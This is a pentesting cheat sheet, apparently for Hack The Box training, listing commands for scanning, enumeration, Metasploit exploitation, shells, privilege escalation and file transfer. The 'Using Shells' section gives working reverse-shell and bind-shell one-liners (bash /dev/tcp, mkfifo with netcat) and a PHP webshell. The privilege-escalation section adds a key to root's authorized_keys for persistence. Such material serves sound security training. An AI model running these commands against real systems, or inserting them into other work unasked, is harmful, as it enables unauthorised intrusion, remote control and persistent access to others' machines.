# Basics - Cheat Sheet

**tags**: #cheatsheet #pentest #offensif #htb #réseau #shell #privilege_escalation

---

## Basic Tools

| Command                          | Description                           |
|----------------------------------|---------------------------------------|
| `sudo openvpn user.ovpn`        | Connect to VPN                        |
| `ifconfig` / `ip a`             | Show IP address                       |
| `netstat -rn`                   | Show accessible networks via VPN      |
| `ssh user@10.10.10.10`          | SSH to remote server                  |
| `ftp 10.129.42.253`             | FTP to remote server                  |

---

## tmux

| Command                     | Description                      |
|-----------------------------|----------------------------------|
| `tmux`                     | Start tmux                       |
| `ctrl+b`                   | Default prefix                   |
| `prefix c`                 | New window                       |
| `prefix 1`                 | Switch to window 1               |
| `prefix Shift+%`           | Split vertically                 |
| `prefix Shift+"`           | Split horizontally               |
| `prefix →`                 | Switch to right pane             |

---

## Vim

| Command         | Description             |
|-----------------|-------------------------|
| `vim file`      | Open file               |
| `esc + i`       | Insert mode             |
| `esc`           | Normal mode             |
| `x`             | Cut character           |
| `dw`            | Cut word                |
| `dd`            | Cut full line           |
| `yw`            | Copy word               |
| `yy`            | Copy full line          |
| `p`             | Paste                   |
| `:1`            | Go to line 1            |
| `:w`            | Save file               |
| `:q`            | Quit                    |
| `:q!`           | Quit without saving     |
| `:wq`           | Save and quit           |

---

## Service Scanning

| Command                                                | Description                    |
|--------------------------------------------------------|--------------------------------|
| `nmap IP`                                              | Basic scan                     |
| `nmap -sV -sC -p- IP`                                  | Script scan                    |
| `locate scripts/citrix`                                | List nmap scripts              |
| `nmap --script smb-os-discovery.nse -p445 IP`          | Run specific nmap script       |
| `netcat IP 22`                                         | Banner grabbing                |
| `smbclient -N -L \\\\IP`                               | List SMB shares                |
| `smbclient \\\\IP\\users`                              | Connect to SMB share           |
| `snmpwalk -v 2c -c public IP OID`                      | SNMP scan                      |
| `onesixtyone -c dict.txt IP`                           | Brute force SNMP string        |

---

## Web Enumeration

| Command                                                                 | Description                 |
|--------------------------------------------------------------------------|-----------------------------|
| `gobuster dir -u http://IP/ -w /usr/share/dirb/wordlists/common.txt`     | Directory scan              |
| `gobuster dns -d domain -w /usr/share/SecLists/.../namelist.txt`         | Subdomain scan              |
| `curl -IL https://domain`                                               | Grab HTTP headers           |
| `whatweb IP`                                                            | Web server info             |
| `curl IP/robots.txt`                                                   | Check `robots.txt`          |
| `Ctrl+U` (Firefox)                                                     | View page source            |

---

## Public Exploits

| Command                                       | Description                   |
|-----------------------------------------------|-------------------------------|
| `searchsploit openssh 7.2`                   | Search public exploits        |
| `msfconsole`                                 | Start Metasploit              |
| `search exploit eternalblue`                 | Search exploits in MSF        |
| `use exploit/windows/smb/ms17_010_psexec`    | Use MSF module                |
| `show options`                               | Show MSF module options       |
| `set RHOSTS IP`                              | Set target                    |
| `check`                                      | Check vulnerability           |
| `exploit`                                    | Launch exploit                |

---

## Using Shells

| Command                                                        | Description                      |
|----------------------------------------------------------------|----------------------------------|
| `nc -lvnp 1234`                                                | Start listener                   |
| `bash -c 'bash -i >& /dev/tcp/IP/1234 0>&1'`                   | Reverse shell                    |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1234 >/tmp/f` | Reverse shell (variant) |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` | Bind shell               |
| `nc IP 1234`                                                   | Connect to bind shell            |
| `python -c 'import pty; pty.spawn("/bin/bash")'`               | TTY upgrade                      |
| `Ctrl+Z → stty raw -echo → fg`                                 | TTY upgrade (manual)             |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create PHP webshell          |
| `curl http://IP/shell.php?cmd=id`                              | Use uploaded webshell            |

---

## Privilege Escalation

| Command                                       | Description                          |
|-----------------------------------------------|---------------------:-----------------|
| `./linpeas.sh`                                | Run linPEAS                          |
| `sudo -l`                                     | List sudo privileges                 |
| `sudo -u user command`                        | Run as another user                  |
| `sudo su -`                                   | Become root                          |
| `sudo su user -`                              | Become another user                  |
| `ssh-keygen -f key`                           | Generate SSH key                     |
| `echo "ssh-rsa ... user@host" >> /root/.ssh/authorized_keys` | Add pubkey to authorized_keys |
| `ssh root@IP -i key`                          | SSH using private key                |

---

## Transferring Files

| Command                                                        | Description                            |
|----------------------------------------------------------------|----------------------------------------|
| `python3 -m http.server 8000`                                  | Start local web server                 |
| `wget http://10.10.14.1:8000/file.sh`                          | Download via wget                      |
| `curl http://10.10.14.1:8000/file.sh -o file.sh`               | Download via curl                      |
| `scp file user@remote:/tmp/file`                               | Transfer via SCP                       |
| `base64 file -w 0`                                              | Encode to base64                       |
| `echo BASE64STRING | base64 -d > file`                         | Decode from base64                     |
| `md5sum file`                                                  | Verify integrity                       |

---

